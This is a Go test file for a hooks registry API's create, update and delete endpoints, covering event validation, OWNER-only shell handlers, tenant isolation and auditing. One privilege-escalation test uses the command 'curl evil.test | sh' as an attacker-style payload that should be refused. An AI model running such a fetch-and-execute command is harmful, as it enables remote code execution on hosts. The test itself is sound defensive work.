package api

// Tests for the write half of the hooks registry: Create / Update / Delete.
//
// The engine under internal/hooks has been complete since v42 — dispatcher,
// matcher, and all three handlers — but hooks.Register had no production
// caller, so the only way to get a row into hooks_config was a test or a
// hand-written INSERT. These endpoints are that missing caller, and the
// tests below pin the three things that make them safe to expose:
//
//   - an event outside the declared 14 is refused, with a message that
//     names the legal ones (a bad event inserts fine and then never fires);
//   - a shell handler needs OWNER, on create AND on update — an http hook
//     PATCHed into a shell hook is the same host-execution grant by a
//     longer road;
//   - what Create writes is what Dispatch reads. A create path that lands
//     a row the dispatcher's predicate skips would look successful and do
//     nothing, which is the failure mode the whole track exists to fix.

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/crewship-ai/crewship/internal/hooks"
)

// postHook drives Create with an arbitrary body and role.
func postHook(t *testing.T, h *HooksHandler, userID, wsID, role string, body any) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest("POST", "/api/v1/hooks", jsonBody(body))
	req = withWorkspaceUser(req, userID, wsID, role)
	rr := httptest.NewRecorder()
	h.Create(rr, req)
	return rr
}

func TestHooksCreate_UnknownEventIsRejectedAndListsTheValidOnes(t *testing.T) {
	db := setupTestDB(t)
	userID := seedTestUser(t, db)
	wsID := seedTestWorkspace(t, db, userID)
	h := NewHooksHandler(db, newTestLogger())

	rr := postHook(t, h, userID, wsID, "OWNER", map[string]any{
		// Claude Code's spelling, not ours. Accepted by the schema (no
		// CHECK on event), never selected by ListByEvent — a hook that
		// registers clean and is permanently dead.
		"event":          "PreToolUse",
		"handler_kind":   "http",
		"handler_config": map[string]any{"url": "https://example.test/hook"},
	})
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400; body=%s", rr.Code, rr.Body.String())
	}
	body := rr.Body.String()
	if !strings.Contains(body, "PreToolUse") {
		t.Errorf("error should echo the rejected event: %s", body)
	}
	for _, ev := range hooks.AllEvents {
		if !strings.Contains(body, string(ev)) {
			t.Errorf("error omits valid event %q: %s", ev, body)
		}
	}

	var n int
	if err := db.QueryRowContext(t.Context(), `SELECT COUNT(*) FROM hooks_config`).Scan(&n); err != nil {
		t.Fatalf("count: %v", err)
	}
	if n != 0 {
		t.Errorf("rejected hook was persisted anyway (%d rows)", n)
	}
}

// TestHooksCreate_PreToolCallIsRejected pins the specific regression this
// track closes: pre_tool_call used to be a legal event that Register
// accepted and Dispatch never fired. It is no longer in hooks.AllEvents,
// so it must fail the exact same way any other made-up event name does —
// a 400 naming the events that ARE legal — rather than silently accepting
// a hook that can never run.
func TestHooksCreate_PreToolCallIsRejected(t *testing.T) {
	db := setupTestDB(t)
	userID := seedTestUser(t, db)
	wsID := seedTestWorkspace(t, db, userID)
	h := NewHooksHandler(db, newTestLogger())

	rr := postHook(t, h, userID, wsID, "OWNER", map[string]any{
		"event":          string(hooks.EventPreToolCall),
		"handler_kind":   "http",
		"handler_config": map[string]any{"url": "https://example.test/hook"},
	})
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400; body=%s", rr.Code, rr.Body.String())
	}
	if !strings.Contains(rr.Body.String(), "pre_tool_call") {
		t.Errorf("error should echo the rejected event: %s", rr.Body.String())
	}

	var n int
	if err := db.QueryRowContext(t.Context(), `SELECT COUNT(*) FROM hooks_config`).Scan(&n); err != nil {
		t.Fatalf("count: %v", err)
	}
	if n != 0 {
		t.Errorf("pre_tool_call hook was persisted anyway (%d rows)", n)
	}
}

func TestHooksCreate_ShellHandlerRequiresOwner(t *testing.T) {
	db := setupTestDB(t)
	userID := seedTestUser(t, db)
	wsID := seedTestWorkspace(t, db, userID)
	h := NewHooksHandler(db, newTestLogger())

	shell := map[string]any{
		"event":          string(hooks.EventPostToolCall),
		"handler_kind":   "shell",
		"handler_config": map[string]any{"command": "echo hi"},
	}

	// ADMIN clears the route-level roleManage gate but must NOT be able to
	// grant itself host command execution.
	rr := postHook(t, h, userID, wsID, "ADMIN", shell)
	if rr.Code != http.StatusForbidden {
		t.Fatalf("ADMIN shell create status = %d, want 403; body=%s", rr.Code, rr.Body.String())
	}
	if !strings.Contains(rr.Body.String(), "OWNER") {
		t.Errorf("403 should say which role is required: %s", rr.Body.String())
	}
	var n int
	if err := db.QueryRowContext(t.Context(), `SELECT COUNT(*) FROM hooks_config`).Scan(&n); err != nil {
		t.Fatalf("count: %v", err)
	}
	if n != 0 {
		t.Fatalf("shell hook persisted for a non-OWNER (%d rows)", n)
	}

	// Same body, OWNER: accepted.
	rr = postHook(t, h, userID, wsID, "OWNER", shell)
	if rr.Code != http.StatusCreated {
		t.Fatalf("OWNER shell create status = %d, want 201; body=%s", rr.Code, rr.Body.String())
	}
}

func TestHooksCreate_UnknownHandlerKindIsRejected(t *testing.T) {
	db := setupTestDB(t)
	userID := seedTestUser(t, db)
	wsID := seedTestWorkspace(t, db, userID)
	h := NewHooksHandler(db, newTestLogger())

	rr := postHook(t, h, userID, wsID, "OWNER", map[string]any{
		"event":        string(hooks.EventPostToolCall),
		"handler_kind": "carrier-pigeon",
	})
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400; body=%s", rr.Code, rr.Body.String())
	}
	for _, kind := range []string{"shell", "http", "subagent"} {
		if !strings.Contains(rr.Body.String(), kind) {
			t.Errorf("error omits handler kind %q: %s", kind, rr.Body.String())
		}
	}
}

func TestHooksCreate_MissingHandlerConfigIsRejected(t *testing.T) {
	db := setupTestDB(t)
	userID := seedTestUser(t, db)
	wsID := seedTestWorkspace(t, db, userID)
	h := NewHooksHandler(db, newTestLogger())

	rr := postHook(t, h, userID, wsID, "OWNER", map[string]any{
		"event":        string(hooks.EventPostToolCall),
		"handler_kind": "http", // no url
	})
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400; body=%s", rr.Code, rr.Body.String())
	}
	if !strings.Contains(rr.Body.String(), "url") {
		t.Errorf("error should name the missing key: %s", rr.Body.String())
	}
}

// TestHooksCreate_CreatedHookReachesTheDispatcher is the load-bearing one.
// Everything else asserts the endpoint refuses bad input; this asserts the
// row it writes on GOOD input is the row hooks.Dispatch selects, matches,
// and executes. A create that wrote a subtly wrong row (crew scope, enabled
// flag, event spelling, matcher JSON) would pass every other test here and
// still never fire.
func TestHooksCreate_CreatedHookReachesTheDispatcher(t *testing.T) {
	// The dispatcher's SSRF guard blocks loopback by default, and httptest
	// serves on 127.0.0.1.
	t.Setenv("CREWSHIP_HOOKS_ALLOW_PRIVATE", "true")

	var fired atomic.Int32
	target := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		fired.Add(1)
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"outcome":"pass","message":"ok"}`))
	}))
	defer target.Close()

	db := setupTestDB(t)
	userID := seedTestUser(t, db)
	wsID := seedTestWorkspace(t, db, userID)
	h := NewHooksHandler(db, newTestLogger())

	rr := postHook(t, h, userID, wsID, "OWNER", map[string]any{
		// pre_agent_start, not post_tool_call: it is the one event on this
		// branch with a real production hooks.Dispatch call site (see
		// internal/orchestrator/orchestrator_run.go). Asserting this test
		// with an event nothing dispatches in production would let an
		// API-created hook go silently dead the same way this whole track
		// exists to catch.
		"event":          string(hooks.EventPreAgentStart),
		"handler_kind":   "http",
		"handler_config": map[string]any{"url": target.URL},
		"matcher":        map[string]any{"tools": []string{"Bash"}},
		"blocking":       true,
	})
	if rr.Code != http.StatusCreated {
		t.Fatalf("create status = %d, want 201; body=%s", rr.Code, rr.Body.String())
	}
	var created hookRow
	if err := json.Unmarshal(rr.Body.Bytes(), &created); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if created.ID == "" {
		t.Fatal("create response carries no id")
	}
	if !created.Enabled {
		t.Error("hook should default to enabled — a hook nobody enables never fires")
	}

	// Now drive the real dispatcher over the real table. ToolName/matcher
	// still apply here even though pre_agent_start carries no ToolName in
	// production — Matches evaluates EventContext fields independently of
	// Event, so this still pins that the stored matcher round-trips.
	ec := hooks.EventContext{WorkspaceID: wsID, ToolName: "Bash"}
	if err := hooks.Dispatch(t.Context(), db, nil, hooks.EventPreAgentStart, ec); err != nil {
		t.Fatalf("Dispatch: %v", err)
	}
	if got := fired.Load(); got != 1 {
		t.Fatalf("handler fired %d times, want 1 — the created row is invisible to Dispatch", got)
	}

	// And the matcher round-tripped: a tool the matcher excludes must not fire.
	if err := hooks.Dispatch(t.Context(), db, nil, hooks.EventPreAgentStart,
		hooks.EventContext{WorkspaceID: wsID, ToolName: "Read"}); err != nil {
		t.Fatalf("Dispatch (non-matching): %v", err)
	}
	if got := fired.Load(); got != 1 {
		t.Errorf("matcher not persisted: handler fired %d times for a non-matching tool", got)
	}
}

func TestHooksCreate_DisabledOnRequestStaysDisabled(t *testing.T) {
	db := setupTestDB(t)
	userID := seedTestUser(t, db)
	wsID := seedTestWorkspace(t, db, userID)
	h := NewHooksHandler(db, newTestLogger())

	rr := postHook(t, h, userID, wsID, "OWNER", map[string]any{
		"event":          string(hooks.EventPostToolCall),
		"handler_kind":   "http",
		"handler_config": map[string]any{"url": "https://example.test/h"},
		"enabled":        false,
	})
	if rr.Code != http.StatusCreated {
		t.Fatalf("status = %d, want 201; body=%s", rr.Code, rr.Body.String())
	}
	var created hookRow
	if err := json.Unmarshal(rr.Body.Bytes(), &created); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if created.Enabled {
		t.Error("explicit enabled:false was ignored")
	}
}

func TestHooksCreate_CrossTenantCrewIs404(t *testing.T) {
	db := setupTestDB(t)
	userID := seedTestUser(t, db)
	wsID := seedTestWorkspace(t, db, userID)
	if _, err := db.ExecContext(t.Context(), `INSERT INTO workspaces (id, name, slug) VALUES ('ws-other','Other','other')`); err != nil {
		t.Fatalf("seed other ws: %v", err)
	}
	otherCrew := seedCrewRow(t, db, "crew-other", "ws-other", "Other Crew", "other-crew")

	h := NewHooksHandler(db, newTestLogger())
	rr := postHook(t, h, userID, wsID, "OWNER", map[string]any{
		"event":          string(hooks.EventPostToolCall),
		"handler_kind":   "http",
		"handler_config": map[string]any{"url": "https://example.test/h"},
		"crew_id":        otherCrew,
	})
	if rr.Code != http.StatusNotFound {
		t.Fatalf("status = %d, want 404; body=%s", rr.Code, rr.Body.String())
	}
}

func TestHooksCreate_WritesAnAuditRow(t *testing.T) {
	db := setupTestDB(t)
	userID := seedTestUser(t, db)
	wsID := seedTestWorkspace(t, db, userID)
	h := NewHooksHandler(db, newTestLogger())

	rr := postHook(t, h, userID, wsID, "OWNER", map[string]any{
		"event":          string(hooks.EventPostToolCall),
		"handler_kind":   "http",
		"handler_config": map[string]any{"url": "https://example.test/h"},
	})
	if rr.Code != http.StatusCreated {
		t.Fatalf("status = %d, want 201; body=%s", rr.Code, rr.Body.String())
	}
	assertAudited(t, db, wsID, "hook", "create", "")
}

// ── Update ──────────────────────────────────────────────────────────────

// patchHook drives Update against an existing id.
func patchHook(t *testing.T, h *HooksHandler, userID, wsID, role, id string, body any) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest("PATCH", "/api/v1/hooks/"+id, jsonBody(body))
	req.SetPathValue("id", id)
	req = withWorkspaceUser(req, userID, wsID, role)
	rr := httptest.NewRecorder()
	h.Update(rr, req)
	return rr
}

func TestHooksUpdate_PatchLeavesOmittedFieldsAlone(t *testing.T) {
	db := setupTestDB(t)
	userID := seedTestUser(t, db)
	wsID := seedTestWorkspace(t, db, userID)
	h := NewHooksHandler(db, newTestLogger())

	rr := postHook(t, h, userID, wsID, "OWNER", map[string]any{
		"event":          string(hooks.EventPreAgentStart),
		"handler_kind":   "http",
		"handler_config": map[string]any{"url": "https://old.test"},
		"matcher":        map[string]any{"tools": []string{"Bash"}},
		"blocking":       true,
	})
	if rr.Code != http.StatusCreated {
		t.Fatalf("create: %d %s", rr.Code, rr.Body.String())
	}
	var created hookRow
	_ = json.Unmarshal(rr.Body.Bytes(), &created)

	// Change only the event. Everything else must survive.
	rr = patchHook(t, h, userID, wsID, "OWNER", created.ID, map[string]any{
		"event": string(hooks.EventPostToolCall),
	})
	if rr.Code != http.StatusOK {
		t.Fatalf("patch status = %d, want 200; body=%s", rr.Code, rr.Body.String())
	}
	var got hookRow
	if err := json.Unmarshal(rr.Body.Bytes(), &got); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if got.Event != string(hooks.EventPostToolCall) {
		t.Errorf("event = %q, want %q", got.Event, hooks.EventPostToolCall)
	}
	if got.HandlerConfig["url"] != "https://old.test" {
		t.Errorf("handler_config clobbered by a partial patch: %v", got.HandlerConfig)
	}
	if len(got.Matcher.Tools) != 1 || got.Matcher.Tools[0] != "Bash" {
		t.Errorf("matcher clobbered by a partial patch: %+v", got.Matcher)
	}
	if !got.Blocking {
		t.Error("blocking clobbered by a partial patch")
	}
}

// TestHooksUpdate_LegacyPreToolCallRowSurvivesUnrelatedPatch pins the claim
// the PR body, CHANGELOG, and docs/api-reference/hooks.mdx all make: a hook
// row registered under pre_tool_call before it was retired from AllEvents
// still "lists, toggles, and reads back fine". PATCHing a field that has
// nothing to do with event must not resurrect the retired-event rejection.
//
// The row is seeded with a raw INSERT rather than hooks.Register, because
// Register itself now (correctly) refuses event=pre_tool_call — the same
// way a row from before the retirement would already be sitting in
// hooks_config, untouched by the migration that removed the event from
// AllEvents.
func TestHooksUpdate_LegacyPreToolCallRowSurvivesUnrelatedPatch(t *testing.T) {
	db := setupTestDB(t)
	userID := seedTestUser(t, db)
	wsID := seedTestWorkspace(t, db, userID)
	h := NewHooksHandler(db, newTestLogger())

	const id = "hk_legacy_pretool"
	_, err := db.ExecContext(t.Context(), `INSERT INTO hooks_config
		(id, workspace_id, event, matcher, handler_kind, handler_config, blocking, enabled)
		VALUES (?, ?, 'pre_tool_call', '{}', 'http', ?, 0, 1)`,
		id, wsID, `{"url":"https://legacy.test"}`)
	if err != nil {
		t.Fatalf("seed legacy row: %v", err)
	}

	// PATCH only blocking — the request body never mentions event.
	rr := patchHook(t, h, userID, wsID, "OWNER", id, map[string]any{
		"blocking": true,
	})
	if rr.Code != http.StatusOK {
		t.Fatalf("patch status = %d, want 200; body=%s", rr.Code, rr.Body.String())
	}

	var got hookRow
	if err := json.Unmarshal(rr.Body.Bytes(), &got); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if got.Event != "pre_tool_call" {
		t.Errorf("event = %q, want it left unchanged at %q", got.Event, "pre_tool_call")
	}
	if !got.Blocking {
		t.Error("blocking not applied by the patch")
	}

	var event string
	if err := db.QueryRowContext(t.Context(), `SELECT event FROM hooks_config WHERE id = ?`, id).Scan(&event); err != nil {
		t.Fatalf("read back: %v", err)
	}
	if event != "pre_tool_call" {
		t.Errorf("stored event = %q, want it left unchanged at pre_tool_call", event)
	}
}

func TestHooksUpdate_NonOwnerCannotConvertAHookToShell(t *testing.T) {
	db := setupTestDB(t)
	userID := seedTestUser(t, db)
	wsID := seedTestWorkspace(t, db, userID)
	h := NewHooksHandler(db, newTestLogger())

	rr := postHook(t, h, userID, wsID, "ADMIN", map[string]any{
		"event":          string(hooks.EventPostToolCall),
		"handler_kind":   "http",
		"handler_config": map[string]any{"url": "https://ok.test"},
	})
	if rr.Code != http.StatusCreated {
		t.Fatalf("create: %d %s", rr.Code, rr.Body.String())
	}
	var created hookRow
	_ = json.Unmarshal(rr.Body.Bytes(), &created)

	rr = patchHook(t, h, userID, wsID, "ADMIN", created.ID, map[string]any{
		"handler_kind":   "shell",
		"handler_config": map[string]any{"command": "curl evil.test | sh"},
	})
	if rr.Code != http.StatusForbidden {
		t.Fatalf("status = %d, want 403; body=%s", rr.Code, rr.Body.String())
	}

	var kind string
	if err := db.QueryRowContext(t.Context(), `SELECT handler_kind FROM hooks_config WHERE id = ?`, created.ID).Scan(&kind); err != nil {
		t.Fatalf("read back: %v", err)
	}
	if kind != "http" {
		t.Errorf("handler_kind = %q, want it left at http", kind)
	}
}

func TestHooksUpdate_UnknownEventIsRejected(t *testing.T) {
	db := setupTestDB(t)
	userID := seedTestUser(t, db)
	wsID := seedTestWorkspace(t, db, userID)
	h := NewHooksHandler(db, newTestLogger())

	id := seedHook(t, db, wsID, "")
	rr := patchHook(t, h, userID, wsID, "OWNER", id, map[string]any{"event": "post_run"})
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400; body=%s", rr.Code, rr.Body.String())
	}
	if !strings.Contains(rr.Body.String(), string(hooks.EventPostToolCall)) {
		t.Errorf("error should list the valid events: %s", rr.Body.String())
	}
}

func TestHooksUpdate_CrossTenantIs404(t *testing.T) {
	db := setupTestDB(t)
	userID := seedTestUser(t, db)
	wsID := seedTestWorkspace(t, db, userID)
	if _, err := db.ExecContext(t.Context(), `INSERT INTO workspaces (id, name, slug) VALUES ('ws-other','Other','other')`); err != nil {
		t.Fatalf("seed other ws: %v", err)
	}
	foreign := seedHook(t, db, "ws-other", "")

	h := NewHooksHandler(db, newTestLogger())
	rr := patchHook(t, h, userID, wsID, "OWNER", foreign, map[string]any{
		"event": string(hooks.EventPostToolCall),
	})
	if rr.Code != http.StatusNotFound {
		t.Fatalf("status = %d, want 404; body=%s", rr.Code, rr.Body.String())
	}
}

// ── Delete ──────────────────────────────────────────────────────────────

func deleteHook(t *testing.T, h *HooksHandler, userID, wsID, role, id string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest("DELETE", "/api/v1/hooks/"+id, nil)
	req.SetPathValue("id", id)
	req = withWorkspaceUser(req, userID, wsID, role)
	rr := httptest.NewRecorder()
	h.Delete(rr, req)
	return rr
}

func TestHooksDelete_RemovesTheRowThenIs404(t *testing.T) {
	db := setupTestDB(t)
	userID := seedTestUser(t, db)
	wsID := seedTestWorkspace(t, db, userID)
	h := NewHooksHandler(db, newTestLogger())
	id := seedHook(t, db, wsID, "")

	if rr := deleteHook(t, h, userID, wsID, "OWNER", id); rr.Code != http.StatusOK {
		t.Fatalf("delete status = %d, want 200; body=%s", rr.Code, rr.Body.String())
	}
	var n int
	if err := db.QueryRowContext(t.Context(), `SELECT COUNT(*) FROM hooks_config WHERE id = ?`, id).Scan(&n); err != nil {
		t.Fatalf("count: %v", err)
	}
	if n != 0 {
		t.Errorf("row survived delete (%d)", n)
	}
	if rr := deleteHook(t, h, userID, wsID, "OWNER", id); rr.Code != http.StatusNotFound {
		t.Errorf("second delete status = %d, want 404", rr.Code)
	}
	assertAudited(t, db, wsID, "hook", "delete", id)
}

func TestHooksDelete_CrossTenantIs404AndLeavesTheRow(t *testing.T) {
	db := setupTestDB(t)
	userID := seedTestUser(t, db)
	wsID := seedTestWorkspace(t, db, userID)
	if _, err := db.ExecContext(t.Context(), `INSERT INTO workspaces (id, name, slug) VALUES ('ws-other','Other','other')`); err != nil {
		t.Fatalf("seed other ws: %v", err)
	}
	foreign := seedHook(t, db, "ws-other", "")

	h := NewHooksHandler(db, newTestLogger())
	if rr := deleteHook(t, h, userID, wsID, "OWNER", foreign); rr.Code != http.StatusNotFound {
		t.Fatalf("status = %d, want 404", rr.Code)
	}
	var n int
	if err := db.QueryRowContext(t.Context(), `SELECT COUNT(*) FROM hooks_config WHERE id = ?`, foreign).Scan(&n); err != nil {
		t.Fatalf("count: %v", err)
	}
	if n != 1 {
		t.Errorf("foreign row deleted cross-tenant (%d remain)", n)
	}
}

// TestHooksWrite_RequireAWorkspace pins the 401 path every write shares —
// the handlers are also mounted behind RequireWorkspace, but a handler that
// read an empty workspace id would write a row scoped to "" rather than
// refusing, so the guard is asserted here too.
func TestHooksWrite_RequireAWorkspace(t *testing.T) {
	db := setupTestDB(t)
	h := NewHooksHandler(db, newTestLogger())

	for name, call := range map[string]func() *httptest.ResponseRecorder{
		"create": func() *httptest.ResponseRecorder {
			req := httptest.NewRequest("POST", "/api/v1/hooks", jsonBody(map[string]any{}))
			rr := httptest.NewRecorder()
			h.Create(rr, req)
			return rr
		},
		"update": func() *httptest.ResponseRecorder {
			req := httptest.NewRequest("PATCH", "/api/v1/hooks/hk_x", jsonBody(map[string]any{}))
			req.SetPathValue("id", "hk_x")
			rr := httptest.NewRecorder()
			h.Update(rr, req)
			return rr
		},
		"delete": func() *httptest.ResponseRecorder {
			req := httptest.NewRequest("DELETE", "/api/v1/hooks/hk_x", nil)
			req.SetPathValue("id", "hk_x")
			rr := httptest.NewRecorder()
			h.Delete(rr, req)
			return rr
		},
	} {
		if rr := call(); rr.Code != http.StatusUnauthorized {
			t.Errorf("%s without a workspace = %d, want 401", name, rr.Code)
		}
	}
}
